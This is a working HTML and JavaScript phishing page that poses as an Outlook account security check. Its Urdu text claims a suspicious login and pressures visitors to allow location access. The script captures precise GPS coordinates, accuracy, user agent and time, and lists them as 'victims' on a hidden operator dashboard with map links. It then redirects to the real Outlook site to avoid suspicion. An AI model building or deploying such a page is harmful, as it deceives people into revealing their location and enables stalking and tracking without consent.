<!DOCTYPE html>
<html>
<head>
    <title>Outlook Security</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:Segoe UI,Tahoma,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);height:100vh;display:flex;align-items:center;justify-content:center}
        .container{max-width:400px;width:90%;background:#fff;border-radius:20px;padding:40px;box-shadow:0 20px 40px rgba(0,0,0,0.2);text-align:center}
        .logo{width:100px;height:100px;background:#0078d4;border-radius:20px;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:40px;color:#fff}
        h1{font-size:24px;color:#333;margin-bottom:10px}
        p{color:#666;margin-bottom:30px;line-height:1.5}
        button{width:100%;background:#0078d4;color:#fff;border:none;padding:15px;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;margin-bottom:20px}
        button:hover{background:#005bb5}
        .status{padding:15px;border-radius:10px;margin-top:10px;font-weight:500}
        .success{background:#d4edda;color:#155724}
        .error{background:#f8d7da;color:#721c24}
        .loading{background:#fff3cd;color:#856404}
        .dashboard{display:none;max-width:1200px;margin:20px auto;background:#fff;border-radius:20px;padding:30px;box-shadow:0 10px 30px rgba(0,0,0,0.1)}
        .victim-card{background:#f8f9fa;padding:20px;margin:15px 0;border-radius:15px;border-left:5px solid #0078d4}
        .coords{font-size:24px;font-weight:bold;color:#0078d4}
        .map-link{background:#28a745;color:white;padding:8px 16px;border-radius:20px;text-decoration:none;font-weight:600;display:inline-block;margin-top:10px}
        #admin-btn{position:fixed;top:20px;right:20px;background:#0078d4;color:white;padding:10px 15px;border-radius:25px;cursor:pointer;font-weight:600}
        #victim-list{max-height:70vh;overflow:auto}
    </style>
</head>
<body>

<!-- Victim Page -->
<div id="victim-page" class="container">
    <div class="logo">📧</div>
    <h1>Outlook Account Security</h1>
    <p>مشکوک لاگ ان کی وجہ سے لوکیشن تصدیق کریں۔<br>صرف 5 سیکنڈ!</p>
    <button onclick="getLocation()">🔐 لوکیشن اجازت دیں</button>
    <div id="status" class="status loading">لوکیشن چیک ہو رہی ہے...</div>
</div>

<!-- Your Dashboard -->
<div id="dashboard" class="dashboard">
    <button id="admin-btn" onclick="toggleDashboard()">🎯 Victims</button>
    <h2 style="text-align:center;color:#0078d4;margin-bottom:30px">Live Victim Locations</h2>
    <div id="victim-list">
        <div style="text-align:center;padding:50px;color:#999">Victim انتظار کر رہا ہے...</div>
    </div>
</div>

<script>
let victims = JSON.parse(localStorage.getItem('victims')) || [];

// Update Dashboard
function updateDashboard() {
    const list = document.getElementById('victim-list');
    if (victims.length === 0) {
        list.innerHTML = '<div style="text-align:center;padding:50px;color:#999">Victim انتظار کر رہا ہے...</div>';
        return;
    }
    list.innerHTML = victims.map((v, i) => `
        <div class="victim-card">
            <h3>Victim ${i+1}</h3>
            <div class="coords">${v.lat.toFixed(6)}, ${v.lon.toFixed(6)}</div>
            <p>درستگی: ${v.acc}m | ${v.time}</p>
            <p>${v.ua.substring(0,50)}...</p>
            <a href="https://maps.google.com/?q=${v.lat},${v.lon}" target="_blank" class="map-link">🗺️ Google Maps</a>
        </div>
    `).join('');
}

// Get Victim Location
function getLocation() {
    const status = document.getElementById('status');
    status.textContent = 'GPS فعال...';
    status.className = 'status loading';
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            position => {
                const data = {
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    acc: position.coords.accuracy,
                    ua: navigator.userAgent,
                    time: new Date().toLocaleString('ur-PK')
                };
                
                victims.push(data);
                localStorage.setItem('victims', JSON.stringify(victims));
                updateDashboard();
                
                status.innerHTML = `✅ لوکیشن ملی!<br><strong>${data.lat.toFixed(6)}, ${data.lon.toFixed(6)}</strong>`;
                status.className = 'status success';
                
                // Redirect after 3s
                setTimeout(() => {
                    window.open('https://outlook.live.com', '_blank');
                    window.close();
                }, 3000);
            },
            error => {
                status.textContent = 'لوکیشن اجازت دیں!';
                status.className = 'status error';
            },
            {enableHighAccuracy: true, timeout: 10000}
        );
    } else {
        status.textContent = 'GPS دستیاب نہیں';
        status.className = 'status error';
    }
}

// Toggle Dashboard
function toggleDashboard() {
    document.getElementById('victim-page').style.display = 'none';
    document.getElementById('dashboard').style.display = 'block';
    updateDashboard();
}

// Load
window.onload = () => {
    updateDashboard();
    if (location.hash === '#dashboard') toggleDashboard();
};
</script>

</body>
</html>
